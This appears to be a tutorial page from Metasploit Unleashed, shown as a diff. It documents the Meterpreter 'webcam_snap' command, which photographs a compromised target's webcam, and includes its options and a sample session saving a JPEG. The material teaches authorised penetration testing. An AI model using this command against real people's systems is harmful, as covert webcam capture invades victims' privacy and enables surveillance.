@@ -1,0 +1,44 @@
+The webcam_snap’ command grabs a picture from a connected web cam on the target system, and saves it to disc as a JPEG image. By default, the save location is the local current working directory with a randomized filename.
+
+meterpreter > webcam_snap -h
+
+Usage: webcam_snap [options]
+Grab a frame from the specified webcam.
+
+OPTIONS:
+
+    -h      Help Banner
+    -i   The index of the webcam to use (Default: 1)
+    -p   The JPEG image path (Default: 'gnFjTnzi.jpeg')
+    -q   The JPEG image quality (Default: '50')
+    -v   Automatically view the JPEG image (Default: 'true')
+
+meterpreter >
+
+
+OPTIONS:
+
+-h:	Displays the help information for the command
+
+-i opt:	If more then 1 web cam is connected, use this option to select the device to capture the
+        image from
+
+-p opt:	Change path and filename of the image to be saved
+
+-q opt:	The imagine quality, 50 being the default/medium setting, 100 being best quality
+
+-v opt:	By default the value is true, which opens the image after capture.
+
+
+Example usage:
+
+meterpreter > webcam_snap -i 1 -v false
+
+[*] Starting...
+[+] Got frame
+[*] Stopped
+Webcam shot saved to: /root/Offsec/YxdhwpeQ.jpeg
+
+meterpreter >
+
+Using webcam_snap Meterpreter plugin | Metasploit Unleashed
